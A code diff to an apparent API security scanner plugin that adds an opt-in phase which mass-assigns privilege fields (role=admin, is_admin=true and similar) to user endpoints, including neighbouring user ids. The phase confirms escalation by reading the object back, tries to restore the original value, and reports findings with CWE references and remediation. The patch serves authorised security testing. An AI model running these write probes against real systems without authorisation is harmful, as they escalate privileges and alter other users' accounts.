@@ -200,6 +200,46 @@ COMMON_READONLY_API_PATHS = [
     "/compliance",
 ]
 
+# --- Privilege-field mass-assignment (gated active-write phase, #319) ---------
+# These run ONLY under aggressive:true + engagement:lab. The read-only path above
+# is unchanged when the gate is off (safe by default).
+WRITE_METHODS = ["PATCH", "PUT", "POST"]
+# Privilege/role attributes an attacker tries to set via mass-assignment. "role"
+# is a string field (-> "admin"); the rest are boolean-ish (-> true).
+DEFAULT_PRIVILEGE_FIELDS = [
+    "role",
+    "is_admin",
+    "admin",
+    "isAdmin",
+    "is_staff",
+    "is_superuser",
+    "superuser",
+]
+PRIVILEGE_ELEVATED_STRING = "admin"
+# High-signal object-update paths probed under the aggressive gate so a target
+# that did not surface its update endpoint during recon is still exercised
+# (mirrors HTB Facts `/admin/users/{id}`).
+COMMON_OBJECT_UPDATE_PATHS = [
+    "/admin/users/1",
+    "/admin/users/2",
+    "/api/users/1",
+    "/api/users/2",
+    "/api/v1/users/1",
+    "/users/1",
+    "/api/user",
+    "/api/me",
+    "/api/profile",
+    "/api/account",
+    "/account",
+    "/profile",
+]
+# Single-object path shapes that are strong mass-assignment candidates even when
+# the GET body does not surface a privilege field (it may be write-only).
+OBJECT_UPDATE_PATH_RE = re.compile(
+    r"/(?:admin/)?(?:users?|accounts?|members?|profiles?|people)(?:/\d+)?/?$",
+    re.I,
+)
+
 
 class ApiAccessControlProbeTool(ToolPlugin):
     @property
@@ -209,8 +249,10 @@ class ApiAccessControlProbeTool(ToolPlugin):
     @property
     def description(self) -> str:
         return (
-            "Runs bounded read-only API authorization probes using observed endpoints: "
-            "anonymous-vs-auth visibility checks and simple IDOR/BOLA candidate mutations."
+            "Runs bounded API authorization probes using observed endpoints: anonymous-vs-auth "
+            "visibility checks and IDOR/BOLA candidate reads. Under aggressive:true + "
+            "engagement:lab it additionally attempts role/is_admin mass-assignment writes on "
+            "object-update endpoints (self + neighbor id) with GET read-back confirmation."
         )
 
     @property
@@ -231,6 +273,37 @@ class ApiAccessControlProbeTool(ToolPlugin):
                 "authCookies": {"type": "string"},
                 "headers": {"type": "object"},
                 "authHeaders": {"type": "object"},
+                "aggressive": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Enable active-write probes. Must be paired with engagement:'lab'.",
+                },
+                "engagement": {
+                    "type": "string",
+                    "enum": ["safe", "lab"],
+                    "default": "safe",
+                    "description": "Safety gate. 'lab' (+aggressive) unlocks privilege-field mass-assignment writes.",
+                },
+                "includePrivilegeMutation": {
+                    "type": "boolean",
+                    "default": True,
+                    "description": "Run the role/is_admin mass-assignment phase (only fires under aggressive+lab).",
+                },
+                "maxMutationRequests": {
+                    "type": "integer",
+                    "default": 60,
+                    "description": "Upper bound on write/read-back requests in the mass-assignment phase.",
+                },
+                "privilegeFields": {
+                    "type": "array",
+                    "items": {"type": "string"},
+                    "description": "Override the privilege fields to mass-assign (default: role/is_admin/admin/...).",
+                },
+                "objectUpdatePaths": {
+                    "type": "array",
+                    "items": {"type": "string"},
+                    "description": "Explicit object-update endpoints to test for mass-assignment.",
+                },
             },
             "oneOf": [{"required": ["target"]}, {"required": ["url"]}, {"required": ["apiEndpoints"]}, {"required": ["urls"]}],
         }
@@ -245,6 +318,15 @@ class ApiAccessControlProbeTool(ToolPlugin):
             "output_type": ["findings", "api_access_control_probe_results"],
             "chainable_after": ["browser:traffic_capture", "api:discover", "param:discover"],
             "chainable_before": ["curl:", "nuclei:"],
+            # --- canonical taxonomy (#559) ---
+            "taxonomy_domain": ["api", "web"],
+            "lifecycle_phase": "assessment",
+            "purpose_count": "multi",
+            "primary_purpose": "API broken-access-control assessment (IDOR/BOLA)",
+            "secondary_purposes": [
+                {"mode": "idor", "purpose": "object-level authorization probe on resource identifiers"},
+                {"mode": "bola", "purpose": "function/endpoint-level authorization probe across roles"},
+            ],
         }
 
     async def execute(self, parameters: Dict[str, Any]) -> Any:
@@ -279,12 +361,28 @@ class ApiAccessControlProbeTool(ToolPlugin):
         auth_headers = parse_headers(parameters)
         anonymous_headers = self._anonymous_headers(auth_headers)
         has_auth_context = self._has_auth_context(auth_headers)
+        aggressive = bool(parameters.get("aggressive", False))
+        engagement = str(parameters.get("engagement") or "safe").lower()
+        privilege_phase_enabled = (
+            aggressive
+            and engagement == "lab"
+            and bool(parameters.get("includePrivilegeMutation", True))
+        )
         findings: List[Dict[str, Any]] = []
         probes: List[Dict[str, Any]] = []
         request_count = 0
 
         connector = aiohttp.TCPConnector(ssl=False)
-        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=18)) as session:
+        # DummyCookieJar: pin the operator-supplied auth cookie for the whole probe.
+        # Without it the shared jar captures Set-Cookie from crawled endpoints (e.g.
+        # a target's /logout clearing the session), which then overrides the supplied
+        # auth header and silently drops the authenticated context mid-scan — breaking
+        # the anonymous-vs-auth diff and the privilege-mutation read-back.
+        async with aiohttp.ClientSession(
+            connector=connector,
+            timeout=aiohttp.ClientTimeout(total=18),
+            cookie_jar=aiohttp.DummyCookieJar(),
+        ) as session:
             for endpoint in endpoints:
                 if request_count >= max_requests:
                     break
@@ -324,6 +422,12 @@ class ApiAccessControlProbeTool(ToolPlugin):
                 if agent:
                     agent.report_progress("Running API access-control probes", url, request_count, max_requests)
 
+            if privilege_phase_enabled:
+                mutation_findings = await self._run_privilege_mutation_phase(
+                    session, target, endpoints, auth_headers, parameters, agent,
+                )
+                findings.extend(mutation_findings)
+
         findings = self._dedupe_findings(findings)
         raw_output = "\n".join(self._finding_line(finding) for finding in findings)
         return {
@@ -343,6 +447,7 @@ class ApiAccessControlProbeTool(ToolPlugin):
                 "findings": len(findings),
                 "findingTypes": self._finding_type_counts(findings),
                 "authContextDetected": has_auth_context,
+                "privilegeMutationRan": privilege_phase_enabled,
             },
         }
 
@@ -426,7 +531,13 @@ class ApiAccessControlProbeTool(ToolPlugin):
         spec_endpoints: List[Dict[str, str]] = []
         headers = parse_headers(parameters)
         connector = aiohttp.TCPConnector(ssl=False)
-        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=45)) as session:
+        # DummyCookieJar (see execute()): preserve the supplied auth cookie so a
+        # crawled /logout does not deauth discovery mid-pass.
+        async with aiohttp.ClientSession(
+            connector=connector,
+            timeout=aiohttp.ClientTimeout(total=45),
+            cookie_jar=aiohttp.DummyCookieJar(),
+        ) as session:
             try:
                 fetched = await fetch_text(session, target, headers=headers, max_bytes=900_000)
                 mapped = extract_html_map(fetched.get("text", ""), fetched.get("url") or target)
@@ -629,6 +740,391 @@ class ApiAccessControlProbeTool(ToolPlugin):
                 "mutatedStatus": mutated_response.get("status"),
             },
         )
+
+    # ---- Privilege-field mass-assignment (gated active-write, #319) ----------
+
+    async def _run_privilege_mutation_phase(
+        self,
+        session: aiohttp.ClientSession,
+        target: str,
+        endpoints: List[Dict[str, str]],
+        auth_headers: Dict[str, str],
+        parameters: Dict[str, Any],
+        agent: Any,
+    ) -> List[Dict[str, Any]]:
+        """aggressive+lab only: attempt role/is_admin mass-assignment on object-update
+        endpoints (self + neighbor id) and confirm via GET read-back before flagging."""
+        privilege_fields = [
+            str(f) for f in (parameters.get("privilegeFields") or DEFAULT_PRIVILEGE_FIELDS) if str(f).strip()
+        ]
+        budget = max(1, min(int(parameters.get("maxMutationRequests") or 60), 200))
+        candidates = self._object_update_candidates(target, endpoints, parameters)
+        if agent:
+            agent.append_output(
+                f"[api:access_control] aggressive+lab — probing {len(candidates)} object-update "
+                f"candidate(s) for privilege-field mass-assignment"
+            )
+        findings: List[Dict[str, Any]] = []
+        used = 0
+        seen_targets: set = set()
+        for candidate in candidates:
+            if used >= budget:
+                break
+            # self id + up to two numeric neighbors (BOLA-write on another id)
+            urls_to_test = [(candidate, False)]
+            for neighbor in self._neighbor_object_urls(candidate)[:2]:
+                urls_to_test.append((neighbor, True))
+            for url, is_neighbor in urls_to_test:
+                if used >= budget:
+                    break
+                if url in seen_targets:
+                    continue
+                seen_targets.add(url)
+                used_now, finding = await self._attempt_mass_assignment(
+                    session, url, privilege_fields, auth_headers, is_neighbor, budget - used,
+                )
+                used += used_now
+                if finding:
+                    findings.append(finding)
+                    if agent:
+                        agent.append_output(
+                            f"[api:access_control] CONFIRMED privilege mass-assignment at {url} "
+                            f"({'neighbor-id' if is_neighbor else 'self-id'})"
+                        )
+        return findings
+
+    def _object_update_candidates(
+        self, target: str, endpoints: List[Dict[str, str]], parameters: Dict[str, Any]
+    ) -> List[str]:
+        parsed = urlparse(target)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        raw: List[str] = []
+        for path in parameters.get("objectUpdatePaths") or []:
+            raw.append(urljoin(base, str(path)))
+        # observed object-shaped endpoints carry the most signal
+        for endpoint in endpoints:
+            url = str(endpoint.get("url") or "")
+            if url and OBJECT_UPDATE_PATH_RE.search(urlparse(url).path or ""):
+                raw.append(url)
+        # built-in object-update pack (covers targets that did not surface theirs)
+        for path in COMMON_OBJECT_UPDATE_PATHS:
+            raw.append(urljoin(base, path))
+        output: List[str] = []
+        seen = set()
+        for url in raw:
+            nurl = normalize_url(url)
+            if not same_origin(target, nurl) or nurl in seen:
+                continue
+            seen.add(nurl)
+            output.append(nurl)
+            if len(output) >= 16:
+                break
+        return output
+
+    def _neighbor_object_urls(self, url: str) -> List[str]:
+        """Numeric-id neighbors of a single-object URL (reuses _mutated_urls logic)."""
+        return [u for u in self._mutated_urls(url) if u != url]
+
+    async def _attempt_mass_assignment(
+        self,
+        session: aiohttp.ClientSession,
+        url: str,
+        privilege_fields: List[str],
+        auth_headers: Dict[str, str],
+        is_neighbor: bool,
+        remaining_budget: int,
+    ) -> Tuple[int, Optional[Dict[str, Any]]]:
+        used = 0
+        # Baseline read — pre-write privilege value + proves the object is readable.
+        before = await self._fetch(session, "GET", url, auth_headers)
+        used += 1
+        if int(before.get("status") or 0) in (0, 401, 403, 404, 405):
+            return used, None
+        # An already-privileged object can't demonstrate escalation (no observable
+        # state change) — skip it. This is both an FP-kill and a budget guard so an
+        # already-admin neighbor does not starve the real candidates.
+        if self._object_already_privileged(before, privilege_fields):
+            return used, None
+        max_object_writes = min(remaining_budget, 18)
+        object_writes = 0
+        for field in privilege_fields:
+            before_val = self._extract_field_value(before, field)
+            elevated = True if field.lower() != "role" else PRIVILEGE_ELEVATED_STRING
+            if self._values_equal(before_val, elevated):
+                continue
+            for kind, payload, injected in self._mass_assignment_payloads(url, field):
+                if used >= remaining_budget or object_writes >= max_object_writes:
+                    return used, None
+                write_resp, w_used = await self._write_with_fallback(session, url, kind, payload, auth_headers)
+                used += w_used
+                object_writes += w_used
+                if not self._write_accepted(write_resp):
+                    continue
+                method = str(write_resp.get("method") or "PATCH")
+                # Read-back confirmation (THE FP-kill): the privilege field must
+                # actually flip to the injected value vs the pre-write baseline.
+                after = await self._fetch(session, "GET", url, auth_headers)
+                used += 1
+                after_val = self._extract_field_value(after, field)
+                confirmed = self._values_equal(after_val, injected) and not self._values_equal(before_val, injected)
+                if not confirmed:
+                    # Weaker signal: the write response echoes the elevated value.
+                    if not self._body_contains_field_value(write_resp, field, injected):
+                        continue
+                severity = "critical" if confirmed else "high"
+                finding = self._mass_assignment_finding(
+                    url=url, method=method, field=field, kind=kind, payload=payload,
+                    injected=injected, before=before, write_resp=write_resp, after=after,
+                    auth_headers=auth_headers, is_neighbor=is_neighbor,
+                    confirmed=confirmed, severity=severity,
+                )
+                # Best-effort restore to leave the target as found.
+                if confirmed and before_val is not None:
+                    await self._write(
+                        session, method, url, kind,
+                        self._restore_payload(field, before_val, kind), auth_headers,
+                    )
+                    used += 1
+                return used, finding
+        return used, None
+
+    def _object_already_privileged(self, response: Dict[str, Any], privilege_fields: List[str]) -> bool:
+        role = self._extract_field_value(response, "role")
+        if role is not None and str(role).strip().lower() in ("admin", "administrator", "superadmin", "root"):
+            return True
+        for field in privilege_fields:
+            if field.lower() == "role":
+                continue
+            value = self._extract_field_value(response, field)
+            if value is True:
+                return True
+            if value is not None and str(value).strip().lower() in ("true", "1", "yes"):
+                return True
+        return False
+
+    async def _write_with_fallback(
+        self, session: aiohttp.ClientSession, url: str, kind: str, payload: Any, headers: Dict[str, str],
+    ) -> Tuple[Dict[str, Any], int]:
+        """Try PATCH; escalate to PUT/POST only when the verb is rejected (405/501)."""
+        used = 0
+        resp: Dict[str, Any] = {}
+        for method in WRITE_METHODS:
+            resp = await self._write(session, method, url, kind, payload, headers)
+            used += 1
+            if int(resp.get("status") or 0) not in (405, 501):
+                return resp, used
+        return resp, used
+
+    def _mass_assignment_payloads(self, url: str, field: str) -> List[Tuple[str, Any, Any]]:
+        """(encoding, payload, injected_value) tuples covering Rails-nested form,
+        flat form, and JSON encodings for a single privilege field."""
+        is_bool = field.lower() != "role"
+        injected: Any = True if is_bool else PRIVILEGE_ELEVATED_STRING
+        flat_value = "true" if is_bool else PRIVILEGE_ELEVATED_STRING
+        resource = self._rails_resource(url)
+        payloads: List[Tuple[str, Any, Any]] = []
+        if resource:
+            payloads.append(("form", {f"{resource}[{field}]": flat_value}, injected))  # user[role]=admin
+        payloads.append(("form", {field: flat_value}, injected))                        # role=admin
+        payloads.append(("json", {field: injected}, injected))                          # {"role":"admin"}
+        if resource:
+            payloads.append(("json", {resource: {field: injected}}, injected))          # {"user":{"role":"admin"}}
+        return payloads
+
+    def _rails_resource(self, url: str) -> str:
+        parts = [p for p in urlparse(url).path.split("/") if p and not re.fullmatch(r"\d+", p)]
+        if not parts:
+            return ""
+        last = parts[-1].lower()
+        singular = {
+            "users": "user", "accounts": "account", "members": "member",
+            "profiles": "profile", "people": "person",
+        }
+        if last in singular:
+            return singular[last]
+        return last[:-1] if last.endswith("s") and len(last) > 1 else last
+
+    def _restore_payload(self, field: str, before_val: Any, kind: str) -> Any:
+        if kind == "json":
+            return {field: before_val}
+        if isinstance(before_val, bool):
+            return {field: "true" if before_val else "false"}
+        return {field: "" if before_val is None else str(before_val)}
+
+    async def _write(
+        self,
+        session: aiohttp.ClientSession,
+        method: str,
+        url: str,
+        kind: str,
+        payload: Any,
+        headers: Dict[str, str],
+    ) -> Dict[str, Any]:
+        started = time.monotonic()
+        kwargs: Dict[str, Any] = {"headers": dict(headers or {}), "allow_redirects": False}
+        if kind == "json":
+            kwargs["json"] = payload
+        else:
+            kwargs["data"] = payload  # aiohttp form-encodes the dict incl. user[role] keys
+        try:
+            async with session.request(method, url, **kwargs) as response:
+                raw = await read_limited(response.content, 250_001)
+                if len(raw) > 250_000:
+                    raw = raw[:250_000]
+                body = raw.decode("utf-8", errors="replace").replace("\0", "")
+                return {
+                    "url": str(response.url),
+                    "status": response.status,
+                    "headers": dict(response.headers),
+                    "body": body,
+                    "elapsedMs": int((time.monotonic() - started) * 1000),
+                    "jsonKeys": self._json_keys(body),
+                    "bodyLength": len(body),
+                    "method": method,
+                }
+        except Exception as exc:
+            return {
+                "url": url, "status": 0, "headers": {}, "body": "",
+                "elapsedMs": int((time.monotonic() - started) * 1000),
+                "error": str(exc)[:300], "jsonKeys": [], "bodyLength": 0, "method": method,
+            }
+
+    def _write_accepted(self, resp: Dict[str, Any]) -> bool:
+        status = int(resp.get("status") or 0)
+        return status in (200, 201, 202, 204) or 300 <= status < 400
+
+    def _extract_field_value(self, response: Dict[str, Any], field: str) -> Any:
+        """Value of `field` from a JSON response body, else None (HTML/non-JSON)."""
+        try:
+            data = json.loads(str(response.get("body") or ""))
+        except Exception:
+            return None
+        return self._find_field(data, field.lower())
+
+    def _find_field(self, value: Any, field_lower: str, depth: int = 0) -> Any:
+        if depth > 6:
+            return None
+        if isinstance(value, dict):
+            for key, child in value.items():
+                if str(key).lower() == field_lower and not isinstance(child, (dict, list)):
+                    return child
+            for child in value.values():
+                found = self._find_field(child, field_lower, depth + 1)
+                if found is not None:
+                    return found
+        elif isinstance(value, list):
+            for item in value[:10]:
+                found = self._find_field(item, field_lower, depth + 1)
+                if found is not None:
+                    return found
+        return None
+
+    def _values_equal(self, a: Any, b: Any) -> bool:
+        if a is None:
+            return False
+        if isinstance(b, bool):
+            if isinstance(a, bool):
+                return a == b
+            return str(a).strip().lower() in (("true", "1", "yes") if b else ("false", "0", "no"))
+        return str(a).strip().lower() == str(b).strip().lower()
+
+    def _body_contains_field_value(self, resp: Dict[str, Any], field: str, injected: Any) -> bool:
+        body = str(resp.get("body") or "").lower()
+        if not body:
+            return False
+        val = ("true" if injected is True else str(injected)).lower()
+        return field.lower() in body and val in body
+
+    def _format_http_request_body(
+        self, method: str, url: str, headers: Dict[str, str], kind: str, payload: Any
+    ) -> str:
+        base = self._format_http_request(method, url, headers)
+        if kind == "json":
+            ctype = "application/json"
+            body = json.dumps(payload)
+        else:
+            ctype = "application/x-www-form-urlencoded"
+            body = "&".join(f"{k}={v}" for k, v in (payload or {}).items())
+        return f"{base}\nContent-Type: {ctype}\nContent-Length: {len(body)}\n\n{body}"
+
+    def _mass_assignment_finding(
+        self, *, url, method, field, kind, payload, injected, before, write_resp, after,
+        auth_headers, is_neighbor, confirmed, severity,
+    ) -> Dict[str, Any]:
+        injected_disp = "true" if injected is True else str(injected)
+        kind_disp = "rails-nested/form" if kind == "form" else "json"
+        if is_neighbor:
+            name = "API Privilege Mass-Assignment on Neighbor Object (BOLA-write)"
+            matcher = "neighbor-object-privilege-write"
+            extra = (
+                "An unprivileged session set a privilege field on ANOTHER object id "
+                "(broken object-level authorization on write)."
+            )
+            extra_tag = "bola"
+        else:
+            name = "API Privilege-Field Mass-Assignment (Privilege Escalation)"
+            matcher = "privilege-field-mass-assignment-confirmed"
+            extra = (
+                "An unprivileged session escalated its own privilege field via "
+                "mass-assignment on an object-update endpoint."
+            )
+            extra_tag = "privesc"
+        confirm_note = (
+            "a GET read-back confirms the field flipped to the injected value"
+            if confirmed
+            else "the write was accepted and its response echoed the elevated value (read-back inconclusive)"
+        )
+        before_val = self._extract_field_value(before, field)
+        after_val = self._extract_field_value(after, field)
+        finding = self._finding(
+            template_id="xasm-api-mass-assignment-privesc",
+            name=name,
+            severity=severity,
+            matched_at=url,
+            description=(
+                f"{extra} A {method} to {url} with `{field}={injected_disp}` ({kind_disp}) "
+                f"was accepted and {confirm_note}. Mass-assignment of privilege attributes "
+                f"(CWE-915) lets a low-privileged user grant themselves an elevated role."
+            ),
+            remediation=(
+                "Whitelist assignable attributes server-side (strong parameters / DTO allow-lists); "
+                "never bind client-supplied role/is_admin fields; enforce object ownership and "
+                "role-change authorization on every update."
+            ),
+            matcher_name=matcher,
+            extracted=[
+                f"endpoint={url}",
+                f"method={method}",
+                f"field={field}",
+                f"injected={injected_disp}",
+                f"encoding={kind_disp}",
+                f"before={'<none>' if before_val is None else before_val}",
+                f"after={'<none>' if after_val is None else after_val}",
+                f"confirmation={'read-back' if confirmed else 'response-echo'}",
+                f"scope={'neighbor-id' if is_neighbor else 'self-id'}",
+            ],
+            evidence={
+                "request": self._format_http_request_body(method, url, auth_headers, kind, payload),
+                "response": self._format_http_response(write_resp),
+                "readbackRequest": self._format_http_request("GET", url, auth_headers),
+                "readbackResponse": self._format_http_response(after),
+                "field": field,
+                "injectedValue": injected_disp,
+                "beforeValue": None if before_val is None else str(before_val),
+                "afterValue": None if after_val is None else str(after_val),
+                "confirmed": confirmed,
+                "scope": "neighbor-id" if is_neighbor else "self-id",
+            },
+        )
+        info = finding.get("info") or {}
+        tags = list(info.get("tags") or [])
+        for tag in ("mass-assignment", "privilege-escalation", extra_tag):
+            if tag not in tags:
+                tags.append(tag)
+        info["tags"] = tags
+        info["classification"] = {"cwe-id": ["CWE-915", "CWE-639"], "owasp": ["API3:2023", "API1:2023"]}
+        finding["info"] = info
+        return finding
 
     def _mutated_urls(self, url: str) -> List[str]:
         parsed = urlparse(url)
